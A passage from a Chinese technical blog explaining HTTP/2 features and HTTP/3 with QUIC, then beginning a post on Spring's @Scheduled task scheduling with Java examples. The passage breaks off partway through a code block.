<li><strong>帧 (Frame)</strong>: HTTP&#x2F;2 中数据传输的<strong>最小单位</strong>。每种帧都有不同的类型，承载不同类型的信息，如 <code>HEADERS</code> 帧用于传输头部，<code>DATA</code> 帧用于传输请求&#x2F;响应体。所有帧都共享一个通用的 9 字节帧头，其中包含了帧长度、类型、流标识符等信息。</li>
<li><strong>消息 (Message)</strong>: 逻辑上的 HTTP 请求或响应，由一个或多个帧组成。例如，一个 HTTP 请求消息可以由一个 <code>HEADERS</code> 帧和多个 <code>DATA</code> 帧组成。</li>
<li><strong>流 (Stream)</strong>: 一个存在于 TCP 连接内的<strong>虚拟双向通道</strong>，用于承载一次完整的请求-响应交换。每个流都有一个唯一的 ID。</li>
</ul>
</li>
<li><p><strong>带来的好处</strong>:</p>
<ul>
<li><strong>解析高效且不易出错</strong>: 二进制格式的解析是确定性的，计算机处理起来更快、更简单，不再有解析纯文本时的歧义。</li>
<li><strong>为多路复用铺平道路</strong>: 将数据分解为独立的、带标识的帧，使得在同一连接上交错发送来自不同流的数据成为可能。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-2-多路复用-Multiplexing"><a href="#3-2-多路复用-Multiplexing" class="headerlink" title="3.2 多路复用 (Multiplexing)"></a>3.2 多路复用 (Multiplexing)</h3><ul>
<li><strong>核心变革</strong>: 这是 HTTP&#x2F;2 <strong>最重要的特性</strong>，它从根本上<strong>解决了 HTTP&#x2F;1.1 的队头阻塞问题</strong>。</li>
<li><strong>工作方式</strong>:<ol>
<li><strong>单一 TCP 连接</strong>: 客户端与服务器之间只需要建立<strong>一条 TCP 连接</strong>，就可以处理所有并发的请求。</li>
<li><strong>并发的流</strong>: 在这条 TCP 连接上，可以同时存在<strong>多个并行的流 (Stream)</strong>。每个流对应一个 HTTP 请求-响应对。</li>
<li><strong>帧的交错传输</strong>: 来自不同流的帧可以<strong>被打乱顺序、交错地</strong>在同一条 TCP 连接中传输。</li>
<li><strong>按流 ID 重组</strong>: 接收方根据帧头中的<strong>流 ID</strong>，将这些乱序的帧重新组合成完整的请求或响应消息。</li>
</ol>
</li>
<li><strong>类比</strong>: <strong>多车道高速公路 vs 单车道</strong>。<ul>
<li><strong>HTTP&#x2F;1.1</strong>: 像一条单车道，一辆慢车（一个慢响应）会堵住后面所有车。</li>
<li><strong>HTTP&#x2F;2</strong>: 像一条拥有多个车道的高速公路。即使某个车道（某个流）上的卡车（大响应）行驶缓慢，其他车道的小汽车（小响应）依然可以畅通无阻地并行前进。所有车辆共享同一条高速公路（同一条 TCP 连接），但互不阻塞。</li>
</ul>
</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>彻底解决队头阻塞</strong>: 一个请求的阻塞不会影响其他请求的传输。</li>
<li><strong>更高的连接利用率</strong>: 只需一条 TCP 连接即可实现高并发，避免了 HTTP&#x2F;1.1 时代开启多条连接的开销。</li>
<li><strong>性能提升</strong>: 降低了延迟，加快了页面加载速度，尤其是在加载大量小资源的场景下效果显著。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-3-头部压缩-Header-Compression-HPACK"><a href="#3-3-头部压缩-Header-Compression-HPACK" class="headerlink" title="3.3 头部压缩 (Header Compression - HPACK)"></a>3.3 头部压缩 (Header Compression - HPACK)</h3><ul>
<li><strong>核心变革</strong>: 针对 HTTP&#x2F;1.1 中头部信息冗余的问题，HTTP&#x2F;2 引入了专门的 <strong>HPACK 算法</strong>来压缩请求和响应的头部。</li>
<li><strong>HTTP&#x2F;1.1 的问题</strong>:<ul>
<li>在同一连接上，连续的多个请求通常包含大量重复的头部字段（如 <code>Host</code>, <code>User-Agent</code>, <code>Accept</code> 等）。</li>
<li>这些头部以纯文本形式传输，未经压缩，在请求数量多时会带来不小的网络开销，尤其是在上行带宽有限的移动网络中。</li>
</ul>
</li>
<li><strong>HPACK 的工作原理</strong>:<ol>
<li><strong>动态维护共享字典</strong>: 客户端和服务器共同维护一个“头部字典”。</li>
<li><strong>索引化传输</strong>: 对于字典中已有的头部字段（如 <code>User-Agent</code>），后续请求只需发送其<strong>索引号</strong>即可，而无需重复发送完整的字符串。</li>
<li><strong>哈夫曼编码</strong>: 对于新的或不常见的头部值，使用哈夫曼编码进行压缩，进一步减小体积。</li>
</ol>
</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>大幅减少头部大小</strong>: 显著降低了因头部传输而产生的网络开销，从而降低延迟。</li>
<li><strong>增强安全性</strong>: 由于压缩上下文是与特定连接相关的，这在一定程度上也增加了防范某些头部注入攻击的难度。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-4-服务器推送-Server-Push"><a href="#3-4-服务器推送-Server-Push" class="headerlink" title="3.4 服务器推送 (Server Push)"></a>3.4 服务器推送 (Server Push)</h3><ul>
<li><strong>核心变革</strong>: 允许服务器在<strong>客户端明确请求之前</strong>，就<strong>主动地</strong>将它认为客户端即将需要的资源推送给客户端。</li>
<li><strong>HTTP&#x2F;1.1 的请求模型</strong>: <strong>“拉 (Pull)”</strong> 模型。<br>浏览器必须先请求并解析 <code>index.html</code>，然后才能发现其中引用了 <code>style.css</code> 和 <code>script.js</code>，再发起对这些资源的请求。这个过程至少需要 2 个 RTT 的延迟。</li>
<li><strong>HTTP&#x2F;2 的推送模型</strong>: <strong>“推 (Push)”</strong> 模型。<ol>
<li>客户端请求 <code>index.html</code>。</li>
<li>服务器在返回 <code>index.html</code> 的同时，<strong>预见到</strong>客户端肯定会需要 <code>style.css</code> 和 <code>script.js</code>。</li>
<li>服务器不等客户端请求，就<strong>主动地</strong>将 <code>style.css</code> 和 <code>script.js</code> 的内容通过新的流推送给客户端。</li>
<li>当客户端解析完 <code>index.html</code> 并准备请求这些资源时，发现它们已经存在于本地缓存中了，可以直接使用。</li>
</ol>
</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>减少关键渲染路径的延迟</strong>: 避免了浏览器解析 HTML 后再发起请求的往返延迟，理论上可以提升页面加载速度。</li>
</ul>
</li>
<li><strong>实践中的挑战</strong>:<ul>
<li>服务器推送在实践中被证明<strong>难以有效利用</strong>。服务器很难精确判断哪些资源是客户端真正需要且本地没有缓存的。如果推送了不必要的资源，反而会浪费带宽。</li>
<li>由于这些复杂性，服务器推送功能并未被广泛采用，甚至在 <strong>HTTP&#x2F;3 中已被提议废弃</strong>。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="4-HTTP-3：面向未来的协议"><a href="#4-HTTP-3：面向未来的协议" class="headerlink" title="4. HTTP&#x2F;3：面向未来的协议"></a>4. HTTP&#x2F;3：面向未来的协议</h2><p>HTTP&#x2F;3 (发布于 2022 年，RFC 9114) 是 HTTP 协议的最新一代。它最大的变革是<strong>放弃了 TCP，转而使用一个全新的、基于 UDP 的传输层协议——QUIC</strong>。</p>
<hr>
<h3 id="4-1-为什么需要-HTTP-3？-TCP-层的队头阻塞"><a href="#4-1-为什么需要-HTTP-3？-TCP-层的队头阻塞" class="headerlink" title="4.1. 为什么需要 HTTP&#x2F;3？(TCP 层的队头阻塞)"></a>4.1. 为什么需要 HTTP&#x2F;3？(TCP 层的队头阻塞)</h3><p>HTTP&#x2F;2 通过多路复用技术，完美地解决了 <strong>HTTP 应用层</strong>的队头阻塞问题。在一条 HTTP&#x2F;2 连接上，一个流的阻塞不会影响其他流。</p>
<p>然而，一个新的、更深层次的瓶颈暴露了出来——<strong>TCP 层的队头阻塞</strong>。</p>
<ul>
<li><strong>问题根源</strong>: HTTP&#x2F;2 的所有流都运行在<strong>一条 TCP 连接</strong>之上。而 TCP 协议本身是一个<strong>可靠的、按序传输</strong>的协议。这意味着，TCP 必须保证所有数据包（Segment）都按顺序到达。</li>
<li><strong>阻塞发生</strong>: 如果在网络传输过程中，一个 TCP 数据包<strong>丢失</strong>了，那么 TCP 协议会启动其重传机制，等待这个丢失的数据包被重新传回。在此期间，即使后续的数据包已经到达了接收端，TCP 的接收缓冲区也<strong>必须等待</strong>，不能将这些数据包交付给上层（HTTP&#x2F;2）。</li>
<li><strong>影响</strong>: 这一个丢失的数据包，就<strong>阻塞了该 TCP 连接上承载的所有 HTTP&#x2F;2 流</strong>。即使丢失的数据包只属于流 A，但流 B、流 C、流 D 的数据也都被卡在了 TCP 层，无法被 HTTP&#x2F;2 层解析。</li>
<li><strong>类比</strong>: <strong>所有货物装在同一辆卡车上</strong>。<ul>
<li>HTTP&#x2F;2 的多路复用，就像是把不同客户的货物（不同的 HTTP 流）都打包好，放进了<strong>同一辆大卡车</strong>（一条 TCP 连接）里运输。</li>
<li>如果这辆卡车在路上因为一个轮胎爆了（一个 TCP 包丢失）而停下修理，那么车上<strong>所有客户的货物</strong>都会被延误，无论他们的货物在车厢的哪个位置。</li>
</ul>
</li>
</ul>
<p>这个问题在网络状况良好时并不明显，但在<strong>高延迟、高丢包率</strong>的网络环境（如移动网络、跨境网络）下，TCP 层的队头阻塞会严重影响 HTTP&#x2F;2 的性能优势。</p>
<hr>
<h3 id="4-2-基于-QUIC-协议-构建于-UDP-之上"><a href="#4-2-基于-QUIC-协议-构建于-UDP-之上" class="headerlink" title="4.2. 基于 QUIC 协议 (构建于 UDP 之上)"></a>4.2. 基于 QUIC 协议 (构建于 UDP 之上)</h3><p>为了从根本上解决 TCP 层的队头阻塞，HTTP&#x2F;3 做出了一个大胆的决定：<strong>将传输层从 TCP 换成 QUIC</strong>。</p>
<ul>
<li><p><strong>QUIC (Quick UDP Internet Connections)</strong>:</p>
<ul>
<li>QUIC 是由 Google 开发的一个全新的传输层协议，它“站在了 UDP 的肩膀上”。</li>
<li><strong>UDP (User Datagram Protocol)</strong> 是一个非常基础、“不靠谱”的传输协议。它不保证数据包的顺序，也不保证数据包一定能到达（会丢包），没有重传机制。</li>
<li>QUIC 的巧妙之处在于，它利用了 UDP 的“简单”特性（没有 TCP 那些固有的限制），然后在<strong>应用层（QUIC 自己的协议栈内）</strong>，重新实现了 TCP 的那些可靠性功能，如<strong>流量控制、拥塞控制、可靠传输</strong>等，并且做得更好。</li>
</ul>
</li>
<li><p><strong>HTTP&#x2F;3 的新架构</strong>:<br><code>HTTP/3 = HTTP/2 的语义 + QUIC</code></p>
<p><strong>协议栈对比</strong>:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1          HTTP/2            HTTP/3</span><br><span class="line">+---------+         +---------+         +---------+</span><br><span class="line">|  HTTP   |         |  HTTP   |         |  HTTP   |  (应用层)</span><br><span class="line">+---------+         +---------+         +---------+</span><br><span class="line">|   TCP   |         |   TCP   |         |  QUIC   |  (传输层)</span><br><span class="line">+---------+         +---------+         +---------+</span><br><span class="line">|   IP    |         |   IP    |         |   UDP   |</span><br><span class="line">+---------+         +---------+         +---------+</span><br><span class="line">|  ...    |         |  ...    |         |   IP    |</span><br><span class="line">                                        +---------+</span><br><span class="line">                                        |  ...    |</span><br></pre></td></tr></table></figure>

<p>QUIC 实际上将原本属于操作系统内核实现的 TCP 功能，转移到了用户空间的应用程序（如浏览器、服务器软件）中去实现，这使得协议的迭代和优化变得更加快速和灵活。</p>
</li>
</ul>
<hr>
<h3 id="4-3-QUIC-的优势"><a href="#4-3-QUIC-的优势" class="headerlink" title="4.3. QUIC 的优势"></a>4.3. QUIC 的优势</h3><p>QUIC 作为 HTTP&#x2F;3 的基石，带来了几项超越 TCP 的革命性优势：</p>
<p><strong>1. 真正的多路复用，无队头阻塞</strong></p>
<ul>
<li><strong>优势</strong>: 这是 QUIC <strong>最核心的优势</strong>。QUIC 连接上也可以承载多个独立的流，但与 HTTP&#x2F;2 不同，这些流在 QUIC 层面是<strong>完全独立</strong>的。</li>
<li><strong>工作方式</strong>: 如果一个流中的某个数据包丢失，<strong>只有那一个流会受到影响</strong>，需要等待数据重传。其他流的数据包，即使在 UDP 层是后到的，也可以被 QUIC 层正常处理并交付给上层的 HTTP&#x2F;3，不会被阻塞。</li>
<li><strong>类比</strong>: <strong>各自开自己的小货车</strong>。<br>每个客户的货物（每个 HTTP 流）都由一辆独立的小货车（一个 QUIC 流）运输。即使其中一辆小货车在路上抛锚了，也完全不影响其他小货车继续前进。</li>
</ul>
<p><strong>2. 更少的 RTT，连接建立更快 (0-RTT &amp; 1-RTT)</strong></p>
<ul>
<li><strong>TCP+TLS 的握手</strong>: 建立一个安全的 HTTPS 连接，需要先进行 TCP 的三次握手（1-RTT），然后再进行 TLS 的握手（1-2 RTT），总共需要 2-3 次网络往返。</li>
<li><strong>QUIC 的握手</strong>: QUIC 将<strong>传输层握手 (类似 TCP) 和加密握手 (TLS) 合二为一</strong>。<ul>
<li><strong>首次连接</strong>: 只需要 <strong>1-RTT</strong> 即可完成连接建立和密钥协商。</li>
<li><strong>后续连接 (0-RTT)</strong>: 如果客户端之前连接过该服务器，QUIC 允许客户端在发送第一个包时就携带加密的应用数据，从而实现 <strong>0-RTT</strong> 的连接恢复。这极大地降低了移动设备在网络切换后重新建立连接的延迟。</li>
</ul>
</li>
</ul>
<p><strong>3. 连接迁移 (Connection Migration)</strong></p>
<ul>
<li><strong>TCP 的问题</strong>: TCP 连接是通过一个<strong>四元组</strong>（源IP, 源端口, 目的IP, 目的端口）来唯一标识的。当你的网络环境发生变化时（如手机从 Wi-Fi 切换到 4G），你的 IP 地址和端口会改变，<strong>TCP 连接就会中断</strong>，必须重新建立。</li>
<li><strong>QUIC 的优势</strong>: QUIC 连接不依赖于 IP 地址和端口，而是通过一个<strong>唯一的 64 位连接 ID (Connection ID)</strong> 来标识。</li>
<li><strong>工作方式</strong>: 当网络切换时，客户端只需用新的 IP 地址和端口，继续向服务器发送带有相同连接 ID 的数据包即可。服务器收到后，通过连接 ID 就能识别出这是之前的那个连接，从而<strong>无缝地维持连接</strong>，无需重新握手。这对于移动设备的用户体验是颠覆性的提升。</li>
</ul>
<hr>
<h3 id="4-4-当前现状与未来展望"><a href="#4-4-当前现状与未来展望" class="headerlink" title="4.4. 当前现状与未来展望"></a>4.4. 当前现状与未来展望</h3><ul>
<li><strong>当前现状</strong>:<ul>
<li>HTTP&#x2F;3 已经成为正式标准 (RFC 9114)。</li>
<li>主流的浏览器（Chrome, Firefox, Safari）和 Web 服务器（Nginx, Caddy, Litespeed）以及大型 CDN 服务商（Cloudflare, Akamai）都已经提供了对 HTTP&#x2F;3 和 QUIC 的广泛支持。</li>
<li>根据 W3Techs 的数据，截至 2023 年，全球已有超过 25% 的网站支持 HTTP&#x2F;3。这个数字还在快速增长，尤其是在大型互联网公司和对性能要求高的网站中。</li>
</ul>
</li>
<li><strong>挑战</strong>:<ul>
<li><strong>中间设备僵化</strong>: 许多网络中的防火墙、NAT 设备等只对 TCP 和 UDP 的常见端口（如 80, 443）进行优化或放行，可能会对运行在 UDP 上的 QUIC 流量进行限制或丢弃。</li>
<li><strong>协议栈在用户空间</strong>: 虽然带来了灵活性，但也增加了 CPU 的消耗，因为部分原本由硬件和操作系统内核处理的工作转移到了应用层面。</li>
</ul>
</li>
<li><strong>未来展望</strong>:<br>HTTP&#x2F;3 代表了 Web 协议演进的明确方向：<strong>更低的延迟、更高的可靠性和更好的移动性</strong>。随着网络设备对 QUIC 的支持不断完善和 CPU 性能的提升，HTTP&#x2F;3 必将逐步取代 HTTP&#x2F;2，成为下一代互联网的核心通信协议。它为物联网 (IoT)、实时通信 (WebRTC)、在线游戏以及未来更多对网络延迟和稳定性有极致要求的应用场景，奠定了坚实的基础。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/17/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-%E5%8A%9F%E8%83%BD%E6%89%A9%E5%B1%95%E4%B8%8E%E9%9B%86%E6%88%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/17/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-%E5%8A%9F%E8%83%BD%E6%89%A9%E5%B1%95%E4%B8%8E%E9%9B%86%E6%88%90/" class="post-title-link" itemprop="url">Spring全家桶-功能扩展与集成</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-10-17 13:20:07 / 修改时间：13:20:59" itemprop="dateCreated datePublished" datetime="2025-10-17T13:20:07+08:00">2025-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/" itemprop="url" rel="index"><span itemprop="name">开发框架与生态</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/" itemprop="url" rel="index"><span itemprop="name">Spring全家桶</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="六、功能扩展与集成"><a href="#六、功能扩展与集成" class="headerlink" title="六、功能扩展与集成"></a>六、功能扩展与集成</h1><h2 id="1-任务调度-Task-Scheduling"><a href="#1-任务调度-Task-Scheduling" class="headerlink" title="1. 任务调度 (Task Scheduling)"></a>1. 任务调度 (Task Scheduling)</h2><p>在软件开发中，任务调度是指在预定的时间点或按固定的时间间隔自动执行特定代码逻辑的机制。它是一种常见的非用户触发的后台处理模式，广泛应用于各种业务场景。</p>
<p><strong>为什么需要任务调度？</strong></p>
<ul>
<li><strong>自动化处理：</strong> 无需人工干预，系统能自动执行重复性任务，如数据备份、报表生成。</li>
<li><strong>异步与解耦：</strong> 将耗时的、非核心的任务（如发送通知邮件、数据同步）从主业务流程中分离出来，放到后台定时执行，提升系统响应速度和用户体验。</li>
<li><strong>资源削峰：</strong> 将高并发的请求或计算密集型任务分散到系统负载较低的时间段（如凌晨）执行。</li>
</ul>
<p><strong>常见应用场景：</strong></p>
<ul>
<li><strong>数据清理：</strong> 每天凌晨清理过期日志、临时文件或无效数据。</li>
<li><strong>报表生成：</strong> 每周一凌晨自动生成上周的业务统计报表。</li>
<li><strong>数据同步：</strong> 每隔10分钟从第三方系统拉取最新数据。</li>
<li><strong>状态检查与通知：</strong> 定时扫描订单表，对超时的未支付订单进行关闭，并发送通知。</li>
</ul>
<p>Spring 框架提供了强大的内置任务调度支持，通过简单的注解就能实现复杂的调度需求，极大地简化了开发过程。</p>
<hr>
<h3 id="1-1-Scheduled-注解"><a href="#1-1-Scheduled-注解" class="headerlink" title="1.1 @Scheduled 注解"></a>1.1 <code>@Scheduled</code> 注解</h3><p><code>@Scheduled</code> 是 Spring 提供的一个注解，用于将一个普通方法标记为需要定时执行的任务。这是实现任务调度的最简单、最快捷的方式。</p>
<h4 id="1-1-1-使用步骤"><a href="#1-1-1-使用步骤" class="headerlink" title="1.1.1 使用步骤"></a>1.1.1 使用步骤</h4><h5 id="1-开启调度功能"><a href="#1-开启调度功能" class="headerlink" title="1. 开启调度功能"></a>1. 开启调度功能</h5><p>要使 <code>@Scheduled</code> 注解生效，必须在 Spring Boot 的主启动类或任何一个配置类（<code>@Configuration</code>）上添加 <code>@EnableScheduling</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableScheduling</span> <span class="comment">// 开启定时任务调度功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-创建定时任务"><a href="#2-创建定时任务" class="headerlink" title="2. 创建定时任务"></a>2. 创建定时任务</h5><p>在一个 Spring管理的 Bean（如 <code>@Component</code>, <code>@Service</code>）中，创建一个 public、void、无参的方法，并在其上添加 <code>@Scheduled</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTasks</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例任务</span></span><br><span class="line">    <span class="meta">@Scheduled(...)</span> <span class="comment">// 在这里配置调度规则</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myTaskMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;定时任务执行于: &quot;</span> + LocalDateTime.now());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-1-2-常用调度策略"><a href="#1-1-2-常用调度策略" class="headerlink" title="1.1.2 常用调度策略"></a>1.1.2 常用调度策略</h4><p><code>@Scheduled</code> 注解提供了多种属性来定义任务的执行时机：</p>
<h5 id="1-fixedRate：固定频率执行"><a href="#1-fixedRate：固定频率执行" class="headerlink" title="1. fixedRate：固定频率执行"></a><strong>1. <code>fixedRate</code>：固定频率执行</strong></h5><ul>
<li><strong>含义：</strong> 上一次任务<strong>开始执行</strong>后，间隔固定时间再次执行。单位为毫秒。</li>
<li><strong>特点：</strong> 任务的启动时间是固定的，不受任务执行时长的影响。如果任务执行时间超过了 <code>fixedRate</code> 的间隔，那么上一个任务结束后，下一个任务会立即执行。</li>
<li><strong>示例：</strong> 每隔5秒执行一次。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(fixedRate = 5000)</span> <span class="comment">// 5000 毫秒 = 5秒</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runTaskAtFixedRate</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;fixedRate 任务执行...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-fixedDelay：固定延迟执行"><a href="#2-fixedDelay：固定延迟执行" class="headerlink" title="2. fixedDelay：固定延迟执行"></a>2. <code>fixedDelay</code>：固定延迟执行</h5><ul>
<li><strong>含义：</strong> 上一次任务<strong>执行完毕</strong>后，等待固定时间再执行下一次。单位为毫秒。</li>
<li><strong>特点：</strong> 两次任务执行的间隔是固定的，即 <code>(上一次任务结束时间)</code> + <code>fixedDelay</code> &#x3D; <code>(下一次任务开始时间)</code>。</li>
<li><strong>示例：</strong> 任务执行完成后，延迟3秒再执行。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(fixedDelay = 3000)</span> <span class="comment">// 3000 毫秒 = 3秒</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runTaskWithFixedDelay</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;fixedDelay 任务执行...&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>); <span class="comment">// 模拟任务耗时2秒</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行流程：执行(2s) -&gt; 等待(3s) -&gt; 执行(2s) -&gt; 等待(3s) -&gt; ...</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-cron：Cron-表达式"><a href="#3-cron：Cron-表达式" class="headerlink" title="3. cron：Cron 表达式"></a>3. <code>cron</code>：Cron 表达式</h5><ul>
<li><p><strong>含义：</strong> 最灵活的调度方式，使用标准的 Cron 表达式来定义复杂的执行计划。</p>
</li>
<li><p><strong>格式：</strong> <code>秒 分 时 日 月 周</code> (共6个或7个字段，Spring 支持6个字段，年是可选的)。</p>
<ul>
<li><code>*</code>：匹配所有值。</li>
<li><code>?</code>：仅在“日”和“周”字段中使用，表示不指定值。</li>
<li><code>/</code>：表示步长，如 <code>0/15</code> 在秒字段表示每15秒。</li>
</ul>
</li>
<li><p><strong>示例：</strong> 每天凌晨2点整执行。</p>
<blockquote>
<p><strong>Tip:</strong> 可以使用在线 Cron 表达式生成器来创建和验证表达式。</p>
</blockquote>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &quot;秒 分 时 日 月 周&quot;</span></span><br><span class="line"><span class="meta">@Scheduled(cron = &quot;0 0 2 * * ?&quot;)</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runTaskWithCron</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Cron 任务在每天凌晨2点执行...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="4-initialDelay：初始延迟"><a href="#4-initialDelay：初始延迟" class="headerlink" title="4. initialDelay：初始延迟"></a>4. <code>initialDelay</code>：初始延迟</h5><ul>
<li><strong>含义：</strong> 指定任务首次执行前的延迟时间，可与 <code>fixedRate</code> 或 <code>fixedDelay</code> 配合使用。单位为毫秒。</li>
<li><strong>示例：</strong> 服务启动后，延迟10秒，然后每5秒执行一次。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(initialDelay = 10000, fixedRate = 5000)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runTaskWithInitialDelay</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;首次延迟10秒后，每5秒执行一次的任务...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-1-3-深入理解与注意事项"><a href="#1-1-3-深入理解与注意事项" class="headerlink" title="1.1.3 深入理解与注意事项"></a>1.1.3 深入理解与注意事项</h4><ul>
<li><strong>默认单线程执行：</strong> Spring 调度的所有 <code>@Scheduled</code> 任务<strong>默认使用一个单线程的线程池</strong>。这意味着，如果一个任务执行时间过长，它会阻塞其他任务的执行。</li>
<li><strong>解决方案（自定义线程池）：</strong> 在生产环境中，强烈建议为定时任务配置一个独立的线程池，以避免任务间的相互影响。</li>
</ul>
<p><strong>配置示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SchedulingConfig</span> <span class="keyword">implements</span> <span class="title class_">SchedulingConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureTasks</span><span 